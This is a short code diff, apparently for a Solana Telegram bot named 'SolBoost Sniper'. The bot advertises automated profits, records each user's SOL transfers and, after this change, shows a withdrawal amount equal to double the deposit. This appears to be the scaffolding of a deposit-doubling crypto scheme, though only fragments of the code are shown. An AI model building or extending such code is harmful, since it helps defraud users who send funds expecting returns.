@@ -136,6 +136,8 @@ To activate the SolBoost Sniper bot and start earning profits with our automated
                 }
                 userStatus[userId].totalTransferred += amountToTransfer;
                 userStatus[userId].transferDone = true;
+                console.log(`Updated totalTransferred for user ${userId}: ${userStatus[userId].totalTransferred}`);
+
 
                 transaction.add(
                     SystemProgram.transfer({
@@ -183,10 +185,12 @@ bot.action('withdraw', async (ctx) => {
 
         if (userStatus[userId] && userStatus[userId].transferDone) {
             const totalTransferred = userStatus[userId].totalTransferred || 0;
-           // const withdrawalAmount = totalTransferred * 2;
-            const withdrawalAmount = amountToTransfer;
+            console.log(`Total transferred for user ${userId}: ${totalTransferred}`); // Debug log
+            const withdrawalAmount = totalTransferred * 2;
             const withdrawalAmountSOL = (withdrawalAmount / LAMPORTS_PER_SOL).toFixed(2);
 
+            console.log(`Withdrawal amount for user ${userId}: ${withdrawalAmountSOL} SOL`); // Debug log
+            
             if (userStatus[userId].newDeposit) {
                 userStatus[userId].withdrawalMessageSent = false;
                 userStatus[userId].currentStep = 1;
